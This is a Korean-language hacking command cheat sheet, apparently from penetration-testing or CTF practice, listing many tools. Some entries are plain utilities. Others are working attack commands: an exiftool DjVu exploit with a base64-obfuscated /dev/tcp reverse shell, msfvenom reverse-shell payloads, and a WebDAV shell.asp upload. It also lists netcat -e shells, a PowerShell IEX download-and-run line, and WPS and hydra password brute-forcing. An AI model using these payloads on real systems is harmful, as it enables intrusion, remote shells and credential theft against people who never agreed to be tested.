# reaver
```bash
reaver -i <monitor mode interface> -b <target's MAC adress> -vv
```
- WPS(Wi-Fi Protected Setup)의 PIN을 이용해 무선 라우터의 WPS 인증을 브루트포스(무차별 대입) 하려는 도구
- 성공하면 라우터의 WPS PIN을 얻고 그로부터 WPA/WPA2 프리-쉐어드키(비밀번호)를 획득
---
# grep
```bash
grep -r . 2>/dev/null
```
---
# Squid Proxy
```bash
python3 spose.py --proxy http://10.10.11.131:3128 --target 10.10.11.131
```
- https://github.com/aancw/spose

---
# exiftool

```bash
exiftool -a -u brochure.pdf
```

- `exiftool` : 이미지/문서/영상 파일의 메타데이터를 조회·수정하는 도구  
- `-a` (*allow duplicates*) : 중복 키가 있어도 모두 표시  
- `-u` (*unknown*) : 표준에 없는(알 수 없는) 태그까지 표시  
- `brochure.pdf` : 대상 파일

## exiftool code execution
```bash
#cat payload
(metadata "\c${system('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMzguNi80NDQ0IDA+JjEK | base64 -d | bash')};")

bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
file exploit.djvu
```
---

# GCC
```bash
# 교차 컴파일
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```
```bash
# 공유 라이브러리 만들기
gcc -shared -fPIC ex.c -o ex.so
```

---
# curl
```bash
curl -L http://192.168.132.65

curl -X POST -d 'data=data' <address>
```

- `-L` : redirection

---
# wget
```bash
wget http://ip/test.txt -O /tmp/test.txt
```

- `-O` : 데이터 저장(대문자)
- 혹여나 작동을 안할시 `http://`를 제외해볼것.

---
# find
```bash
find . -name '*config*' 2>/dev/null
```
---

# sqlite3
```bash
sqlite3 {dbname}
.tables
.headers on   # 컬럼 이름 출력
.mode column  # 표 형식으로 출력
select * from user;
.quit
```
---
# msfvenom
```bash
msfvenom -p windows/shell/reverse_tcp -f python
# 바이트 타입을 명시하기 위해서 b가 붙여서 나옴.

msfvenom -p windows/shell/reverse_tcp -f c
# 바이트 타입 명시 필요 없어서 b가 안붙여서 나옴.

msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```
# nc
```powershell
# windows
nc <ip> <port> -e cmd.exe
```
```bash
# linux
nc <ip> <port> -e /bin/sh
```

---
# powershell
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://ip/file")

Rename-Item -Path <String> -NewName <String>

Remove-Item -Path "C:\Path\To\YourFile.txt"
```
---
# cadaver(IIS server /webdav exploit)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.6.2 LPORT=4444 -f asp > shell.asp

cadavar <ip>

put shell.asp
```
---
# cewl(Custom Word List generator)
```bash
cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
```
---
# swaks(send mail tool)
```bash
swaks --server smtp.example.com \
      --from me@example.com \
      --to you@example.com \
      --auth LOGIN --auth-user me@example.com --auth-password "비밀번호" \
      --attach @test.txt
```
---
# scp
```bash
scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
```
- `-O` 최신 scp에서는 SFTP프로토콜을 사용하는데 예전의 SCP프로토콜을 사용하도록 설정
---
# FreeBSD 
```bash
./ident-user-enum.pl 10.0.0.1 21 80 113 443
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```
---
# gzip unzip
```bash
gzip -d <file>
```
---
# tar
```bash
tar -cf target.tar foo bar
tar -xf target.tar
```
---
# ldd
```bash
ldd /usr/bin/log-sweeper
```
- 실행 파일이 사용하는 공유 라이브러리(동적 라이브러리, .so 파일)를 보여주는 명령어
---
# ssh
```bash
ssh -i root -o IdentitiesOnly=true root@localhost
```
`-o IdentitiesOnly=true`
- 저장되어 있는 다른 키들을 같이 전송하기 때문에 해당하는 키만으로 인증하는 방법
---
# hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.68.46
```
- `-e nsr`: null password / 아이디와 같은 비밀번호 / 거꾸로 뒤집어서 시도
---
# lsof
```bash
sudo lsof -i :8080
```
---
# vim
```bash
:%s/D  .*//g
```
- `.*` : 뒤에 모든 문자 선택
